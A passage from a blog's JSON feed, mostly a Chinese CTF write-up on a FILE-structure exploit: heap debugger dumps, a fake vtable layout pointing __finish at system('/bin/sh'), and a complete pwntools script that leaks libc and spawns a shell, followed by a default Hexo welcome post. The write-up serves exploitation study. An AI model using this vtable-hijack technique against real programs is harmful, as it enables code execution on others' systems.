class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">0x804c408</span> PREV_INUSE &#123;\t\t\t\t\t<span class=\"comment\">//IO_FILE_plus 堆块</span></span><br><span class=\"line\">  prev_size = <span class=\"number\">0</span>, </span><br><span class=\"line\">  size = <span class=\"number\">353</span>, </span><br><span class=\"line\">  fd = <span class=\"number\">0xf7fb77b0</span> &lt;main_arena+<span class=\"number\">48</span>&gt;, </span><br><span class=\"line\">  bk = <span class=\"number\">0xf7fb77b0</span> &lt;main_arena+<span class=\"number\">48</span>&gt;, </span><br><span class=\"line\">  fd_nextsize = <span class=\"number\">0x804c570</span>, </span><br><span class=\"line\">  bk_nextsize = <span class=\"number\">0x804c570</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"number\">0x804c568</span> &#123;</span><br><span class=\"line\">  prev_size = <span class=\"number\">352</span>, </span><br><span class=\"line\">  size = <span class=\"number\">4104</span>, </span><br><span class=\"line\">  fd = <span class=\"number\">0x61616161</span>, </span><br><span class=\"line\">  bk = <span class=\"number\">0x61616161</span>, </span><br><span class=\"line\">  fd_nextsize = <span class=\"number\">0x61616161</span>, </span><br><span class=\"line\">  bk_nextsize = <span class=\"number\">0xa6161</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"number\">0x804d570</span> PREV_INUSE &#123;</span><br><span class=\"line\">  prev_size = <span class=\"number\">0</span>, </span><br><span class=\"line\">  size = <span class=\"number\">129681</span>, </span><br><span class=\"line\">  fd = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">  bk = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">  fd_nextsize = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">  bk_nextsize = <span class=\"number\">0x0</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\">pwndbg&gt; p *(<span class=\"keyword\">struct</span> _IO_FILE_plus *)<span class=\"number\">0x804c410</span></span><br><span class=\"line\">$<span class=\"number\">5</span> = &#123;</span><br><span class=\"line\">  file = &#123;</span><br><span class=\"line\">    _flags = <span class=\"number\">-134514768</span>, </span><br><span class=\"line\">    _IO_read_ptr = <span class=\"number\">0xf7fb77b0</span> &lt;main_arena+<span class=\"number\">48</span>&gt; <span class=\"string\">&quot;p\\325\\004\\b&quot;</span>, </span><br><span class=\"line\">    _IO_read_end = <span class=\"number\">0x804c570</span> <span class=\"string\">&#x27;a&#x27;</span> &lt;repeats <span class=\"number\">14</span> times&gt;, <span class=\"string\">&quot;\\n&quot;</span>, </span><br><span class=\"line\">    _IO_read_base = <span class=\"number\">0x804c570</span> <span class=\"string\">&#x27;a&#x27;</span> &lt;repeats <span class=\"number\">14</span> times&gt;, <span class=\"string\">&quot;\\n&quot;</span>, </span><br><span class=\"line\">    _IO_write_base = <span class=\"number\">0x804c570</span> <span class=\"string\">&#x27;a&#x27;</span> &lt;repeats <span class=\"number\">14</span> times&gt;, <span class=\"string\">&quot;\\n&quot;</span>, </span><br><span class=\"line\">    _IO_write_ptr = <span class=\"number\">0x804c570</span> <span class=\"string\">&#x27;a&#x27;</span> &lt;repeats <span class=\"number\">14</span> times&gt;, <span class=\"string\">&quot;\\n&quot;</span>, </span><br><span class=\"line\">    _IO_write_end = <span class=\"number\">0x804c570</span> <span class=\"string\">&#x27;a&#x27;</span> &lt;repeats <span class=\"number\">14</span> times&gt;, <span class=\"string\">&quot;\\n&quot;</span>, </span><br><span class=\"line\">    _IO_buf_base = <span class=\"number\">0x804c570</span> <span class=\"string\">&#x27;a&#x27;</span> &lt;repeats <span class=\"number\">14</span> times&gt;, <span class=\"string\">&quot;\\n&quot;</span>, </span><br><span class=\"line\">    _IO_buf_end = <span class=\"number\">0x804d570</span> <span class=\"string\">&quot;&quot;</span>, </span><br><span class=\"line\">    _IO_save_base = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _IO_backup_base = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _IO_save_end = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _markers = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _chain = <span class=\"number\">0xf7fb7cc0</span> &lt;_IO_2_1_stderr_&gt;, </span><br><span class=\"line\">    _fileno = <span class=\"number\">3</span>, </span><br><span class=\"line\">    _flags2 = <span class=\"number\">0</span>, </span><br><span class=\"line\">    _old_offset = <span class=\"number\">0</span>, </span><br><span class=\"line\">    _cur_column = <span class=\"number\">0</span>, </span><br><span class=\"line\">    _vtable_offset = <span class=\"number\">0</span> <span class=\"string\">&#x27;\\000&#x27;</span>, </span><br><span class=\"line\">    _shortbuf = <span class=\"string\">&quot;&quot;</span>, </span><br><span class=\"line\">    _lock = <span class=\"number\">0x804c4a8</span>, </span><br><span class=\"line\">    _offset = <span class=\"number\">-1</span>, </span><br><span class=\"line\">    _codecvt = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _wide_data = <span class=\"number\">0x804c4b4</span>, </span><br><span class=\"line\">    _freeres_list = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _freeres_buf = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    __pad5 = <span class=\"number\">0</span>, </span><br><span class=\"line\">    _mode = <span class=\"number\">-1</span>, </span><br><span class=\"line\">    _unused2 = <span class=\"string\">&#x27;\\000&#x27;</span> &lt;repeats <span class=\"number\">39</span> times&gt;</span><br><span class=\"line\">  &#125;, </span><br><span class=\"line\">  vtable = <span class=\"number\">0xf7fb6ac0</span> &lt;_IO_file_jumps&gt;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>可以看到，此时只是对 file 堆块进行了释放，而没有对其数据进行清空，io_read_ptr 变为了 main_arena, 这是因为其加入了 unsortedbins, 但是这块是或否执行了 unlink 操作呢？但是我们看到了储存数据的堆块并没有进行 free 操作。这里这样操作，如果存在 UAF 是否可以实现泄露数据呢？</p>\n<p>泄露地址的操作，在进行数据泄露的时候除了程序的内存表，还可以利用环境的相关内容。通过打开 /proc/self/mmap 这个虚拟文件来获取当前进程的地址空间情况，</p>\n</li>\n<li></li>\n</ol>\n<p>整体思路：1. 泄露 libc 地址，获取 system 函数的真实地址</p>\n<p>​\t2. 利用 fp 后面的 bss 伪造 file_plus 的结构体（）这部分内存全是空的</p>\n   <figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">name:<span class=\"number\">0x0</span>,\t\t\t\t<span class=\"comment\">//0x20字节</span></span><br><span class=\"line\">\t<span class=\"number\">0x0</span>,</span><br><span class=\"line\">\t<span class=\"number\">0x0</span>,</span><br><span class=\"line\">\t<span class=\"number\">0x0</span>,</span><br><span class=\"line\">fp:fake_file_start </span><br><span class=\"line\"><span class=\"comment\">//下面时伪造的file</span></span><br><span class=\"line\">flags_:<span class=\"number\">0xffffdfff</span>\t\t\t<span class=\"comment\">//fake_file_start</span></span><br><span class=\"line\">_io_read_ptr:<span class=\"string\">&quot;;/bin/sh&quot;</span></span><br><span class=\"line\"><span class=\"comment\">//下面就可以全是0</span></span><br><span class=\"line\">vtable:fake_file_start+<span class=\"number\">0x94</span>+<span class=\"number\">4</span> </span><br><span class=\"line\"><span class=\"comment\">//fake_vatable   fclose偏移为2</span></span><br><span class=\"line\">    JUMP_FIELD(<span class=\"type\">size_t</span>, __dummy)：<span class=\"number\">0</span></span><br><span class=\"line\">    JUMP_FIELD(<span class=\"type\">size_t</span>, __dummy2)）：<span class=\"number\">0</span></span><br><span class=\"line\">    JUMP_FIELD(_IO_finish_t, __finish)：system_addr</span><br><span class=\"line\"> <span class=\"comment\">//剩下的全写0</span></span><br></pre></td></tr></table></figure>\n<p>调用_IO_FINSH (fp)，_IO_FINISH (fp) 相当于调用 fp-&gt;vtabl-&gt;__finish (fp)，此时实际上执行的 system (fp);</p>\n<p>因此此时的 fp 指针其实就是 system 的参数，虽然 fp 并未直接指向 &quot;/bin/sh&quot;, 但是 system 解析指令的时，无法解析 0xffffdfff，便会继续向后检查，这里除了写”;bin/sh“, 话可以有”||/bin/sh“, 覆盖后面的指针也问题不大</p>\n<h2 id=\"补充后来复现在这个题的时候发现通过上面的伪造方式是无法实现vtable指针的改写是因为数据过长后到了bss下面的区域这块区域会将数据清空而且我们在改的过程中还有一个值得注意的地方就是io_file-里面-的_offset变量一定要是我们fp指针的4偏移\"><a class=\"markdownIt-Anchor\" href=\"#补充后来复现在这个题的时候发现通过上面的伪造方式是无法实现vtable指针的改写是因为数据过长后到了bss下面的区域这块区域会将数据清空而且我们在改的过程中还有一个值得注意的地方就是io_file-里面-的_offset变量一定要是我们fp指针的4偏移\">#</a> 补充，后来复现在这个题的时候，发现通过上面的伪造方式，是无法实现 vtable 指针的改写，是因为数据过长后，到了 bss 下面的区域，这块区域会将数据清空，而且我们在改的过程中，还有一个值得注意的地方，就是 io_file 里面 的_offset 变量，一定要是我们 fp 指针的 + 4 偏移</h2>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level = <span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">r=process(<span class=\"string\">&#x27;./seethefile&#x27;</span>)</span><br><span class=\"line\">elf =ELF(<span class=\"string\">&quot;./seethefile&quot;</span>)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">&quot;/lib/i386-linux-gnu/libc-2.23.so&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">name = <span class=\"number\">0x804B260</span></span><br><span class=\"line\">fp = <span class=\"number\">0x804B280</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">ch</span>(<span class=\"params\">i</span>):</span><br><span class=\"line\">\tr.sendlineafter(<span class=\"string\">&quot;Your choice :&quot;</span> ,<span class=\"built_in\">str</span>(i))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">open_file</span>(<span class=\"params\">file_path</span>):</span><br><span class=\"line\">\tch(<span class=\"number\">1</span>)</span><br><span class=\"line\">\tr.sendlineafter(<span class=\"string\">&quot;What do you want to see :&quot;</span>,file_path)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">open_file(<span class=\"string\">&quot;/proc/self/maps&quot;</span>)</span><br><span class=\"line\">ch(<span class=\"number\">2</span>)</span><br><span class=\"line\">ch(<span class=\"number\">3</span>)</span><br><span class=\"line\">ch(<span class=\"number\">2</span>)</span><br><span class=\"line\">ch(<span class=\"number\">3</span>)</span><br><span class=\"line\">r.recvuntil(<span class=\"string\">&quot;[heap]\\n&quot;</span>)</span><br><span class=\"line\">libc_base = <span class=\"built_in\">int</span>(<span class=\"string\">b&quot;0x&quot;</span>+r.recv(<span class=\"number\">8</span>),<span class=\"number\">16</span>)+<span class=\"number\">0x1000</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(libc_base))</span><br><span class=\"line\">system_addr = libc.sym[<span class=\"string\">&#x27;system&#x27;</span>] + libc_base</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;system : &quot;</span>,<span class=\"built_in\">hex</span>(system_addr))</span><br><span class=\"line\">payload = <span class=\"string\">b&#x27;\\x01\\xA0;/bin/sh\\x00\\x00&#x27;</span>+p32(system_addr)+p32(<span class=\"number\">0</span>)*<span class=\"number\">4</span>+p32(name)</span><br><span class=\"line\">payload +=p32(<span class=\"number\">0xcafebabe</span>)*<span class=\"number\">5</span> + p32(<span class=\"number\">0xffffffff</span>) + p32(<span class=\"number\">0xcafebabe</span>)*<span class=\"number\">4</span> +p32(name+<span class=\"number\">4</span>)</span><br><span class=\"line\">payload =payload.ljust(<span class=\"number\">0x94</span>,<span class=\"string\">b&#x27;a&#x27;</span>)+p32(<span class=\"number\">0x0804b264</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">gdb.attach(r,<span class=\"string\">&#x27;b *0x08048AF5&#x27;</span>)</span><br><span class=\"line\">ch(<span class=\"number\">5</span>)</span><br><span class=\"line\">r.sendlineafter(<span class=\"string\">&quot;Leave your name :&quot;</span>,payload)</span><br><span class=\"line\">r.interactive()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>总结：这个文章内容比较多，但是重点就在与 io_file_plus 以及虚表的使用，有时候较低的版本可以不去伪造 vtable, 而时可以直接修改 vtable 的数据，但是当下的新版本不在可以。对于不同的函数有不同的利用姿势。、</p>\n",
            "tags": [
                "writeup"
            ]
        },
        {
            "id": "http://example.com/2021/03/19/hello-world/",
            "url": "http://example.com/2021/03/19/hello-world/",
            "title": "Hello World",
            "date_published": "2021-03-18T16:00:00.000Z",
            "content_html": "<p>Welcome to <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvLw==\">Hexo</span>! This is your very first post. Check <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3Mv\">documentation</span> for more info. If you get any problems when using Hexo, you can find the answer in <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3MvdHJvdWJsZXNob290aW5nLmh0bWw=\">troubleshooting</span> or you can ask me on <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2hleG9qcy9oZXhvL2lzc3Vlcw==\">GitHub</span>.</p>\n<h2 id=\"quick-start\"><a class=\"markdownIt-Anchor\" href=\"#quick-start\">#</a> Quick Start</h2>\n<h3 id=\"create-a-new-post\"><a class=\"markdownIt-Anchor\" href=\"#create-a-new-post\">#</a> Create a new post</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo new <span class=\"string\">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>\n<p>More info: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvd3JpdGluZy5odG1s\">Writing</span></p>\n<h3 id=\"run-server\"><a class=\"markdownIt-Anchor\" href=\"#run-server\">#</a> Run server</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo server</span><br></pre></td></tr></table></figure>\n<p>More info: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvc2VydmVyLmh0bWw=\">Server</span></p>\n<h3 id=\"generate-static-files\"><a class=\"markdownIt-Anchor\" href=\"#generate-static-files\">#</a> Generate static files</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo generate</span><br></pre></td></tr></table></figure>\n<p>More info: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3MvZ2VuZXJhdGluZy5odG1s\">Generating</span></p>\n<h3 id=\"deploy-to-remote-sites\"><a class=\"markdownIt-Anchor\" href=\"#deploy-to-remote-sites\">#</a> Deploy to remote sites</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo deploy</span><br></pre></td></tr></table></figure>\n<p>More info: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvb25lLWNvbW1hbmQtZGVwbG95bWVudC5odG1s\">Deployment</span></p>\n",
            "tags": [
                "Hello World"
            ]
        }
    ]
}